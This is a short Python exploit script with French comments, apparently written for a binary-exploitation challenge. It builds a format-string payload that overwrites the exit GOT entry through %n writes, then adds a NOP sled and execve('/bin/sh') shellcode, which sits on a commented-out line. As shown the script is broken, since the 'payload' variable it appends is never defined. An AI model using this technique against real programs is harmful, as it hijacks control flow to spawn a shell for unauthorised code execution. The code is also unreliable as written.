#!/usr/bin/env python3

import struct

# 0x80497e0 <exit@got.plt>:	0x08048376
EXIT_GOT = 0x80497e0
ADDR_FGETS = 0xffffdfc6  # offset de 2 bytes

ADDR_LOW = (ADDR_FGETS & 0xffff) - 8
ADDR_HIGH = ((ADDR_FGETS >> 16) & 0xffff) + 0x10000 - 8
#
# print(hex(ADDR_LOW), hex(ADDR_HIGH))
#
exploit = struct.pack("I", EXIT_GOT)
exploit += struct.pack("I", EXIT_GOT + 2)
# 0xd69a = 54938 en base 10
# on a deja ecrit 8 chars avec les 2 addr de struct.pack

exploit += f"%10${ADDR_LOW}x".encode("ascii")
exploit += "%10$n".encode("ascii")
exploit += f"%11${ADDR_HIGH - ADDR_LOW}x".encode("ascii")
exploit += "%11$n".encode("ascii")

# payload=b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

exploit += b"\x90" * (99 - len(exploit))

exploit+=payload


print(exploit)
